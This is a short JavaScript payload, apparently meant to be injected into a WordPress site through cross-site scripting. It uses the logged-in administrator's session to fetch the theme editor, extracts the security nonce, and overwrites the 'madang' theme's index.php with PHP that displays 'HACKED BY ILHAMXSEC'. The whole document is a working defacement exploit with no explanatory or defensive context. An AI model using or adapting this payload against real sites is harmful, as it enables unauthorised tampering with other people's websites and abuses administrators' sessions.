(function() {
  fetch('/wp-admin/theme-editor.php?file=index.php&theme=madang', {credentials: 'include'})
    .then(r => r.text())
    .then(html => {
      var nonceMatch = html.match(/name="_wpnonce" value="([^"]+)"/);
      if (!nonceMatch) return;
      var nonce = nonceMatch[1];
      var defaceContent = '<?php echo "<h1>HACKED BY ILHAMXSEC</h1>"; ?>';
      var formData = new FormData();
      formData.append('_wpnonce', nonce);
      formData.append('newcontent', defaceContent);
      formData.append('action', 'update');
      formData.append('file', 'index.php');
      formData.append('theme', 'madang');
      return fetch('/wp-admin/theme-editor.php', {
        method: 'POST',
        credentials: 'include',
        body: formData
      });
    });
})();
